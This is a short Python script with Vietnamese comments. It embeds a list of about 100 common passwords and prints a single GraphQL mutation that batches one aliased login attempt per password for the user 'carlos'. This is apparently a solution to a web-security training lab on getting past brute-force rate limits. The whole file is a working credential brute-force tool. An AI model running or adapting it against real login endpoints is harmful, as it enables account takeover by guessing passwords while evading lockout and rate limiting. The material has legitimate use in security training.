# lines_to_array_inline.py
# Dùng payload nội bộ (không đọc file)

payload = """123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
123123
baseball
abc123
football
monkey
letmein
shadow
master
666666
qwertyuiop
123321
mustang
1234567890
michael
654321
superman
1qaz2wsx
7777777
121212
000000
qazwsx
123qwe
killer
trustno1
jordan
jennifer
zxcvbnm
asdfgh
hunter
buster
soccer
harley
batman
andrew
tigger
sunshine
iloveyou
2000
charlie
robert
thomas
hockey
ranger
daniel
starwars
klaster
112233
george
computer
michelle
jessica
pepper
1111
zxcvbn
555555
11111111
131313
freedom
777777
pass
maggie
159753
aaaaaa
ginger
princess
joshua
cheese
amanda
summer
love
ashley
nicole
chelsea
biteme
matthew
access
yankees
987654321
dallas
austin
thunder
taylor
matrix
mobilemail
mom
monitor
monitoring
montana
moon
moscow"""

username = "carlos"  # đổi nếu cần

def escape_for_string(s: str) -> str:
    return s.replace("\\", "\\\\").replace('"', '\\"')

# --- xử lý ---
lines = [ln.strip() for ln in payload.splitlines() if ln.strip()]
# Full GraphQL mutation (mutation { ... })
fragments = []
for i, pw in enumerate(lines, start=1):
    esc = escape_for_string(pw)
    fragments.append(
        f'  login_{i}: login(input:{{username:"{username}",password:"{esc}"}} ) {{\n'
        '            token\n'
        '            success\n'
        '        }'
    )
mutation = "mutation {\n" + "\n".join(fragments) + "\n}"

# --- xuất ---
print("\n# Full GraphQL mutation:")
print(mutation)
